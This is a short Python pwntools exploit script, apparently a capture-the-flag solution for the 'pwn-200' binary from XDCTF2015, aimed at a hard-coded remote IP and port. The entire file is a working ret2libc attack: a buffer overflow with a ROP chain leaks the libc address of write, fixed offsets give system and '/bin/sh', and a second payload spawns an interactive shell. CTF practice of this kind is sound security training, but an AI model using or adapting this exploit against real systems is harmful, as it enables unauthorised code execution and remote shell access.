from pwn import *
from LibcSearcher import *

context.log_level = "debug"

elf = ELF("./pwn-200")
# r = process("./pwn-200")
r = remote("111.200.241.244", 54697)

junk = cyclic(0x70)
rop = ROP(elf)
rop.call("write", [1, elf.got["write"], 4])
rop.call(0x80484be)  # main : 0x80484be
payload1 = junk + rop.chain()
r.recvuntil(b"Welcome to XDCTF2015~!\n")
r.sendline(payload1)
write = u32(r.recv()[0:4])
log.debug("libc_write: " + hex(write))
# libc = LibcSearcher("write", write)
libc_base = write - 0xd43c0

# log.debug("libc_base: " + hex(libc_base))
system = 0x3a940 + libc_base
bin_sh = 0x15902b + libc_base
payload2 = junk + p32(system) + p32(0) + p32(bin_sh)
r.recvuntil(b"Welcome to XDCTF2015~!\n")
r.sendline(payload2)
r.interactive()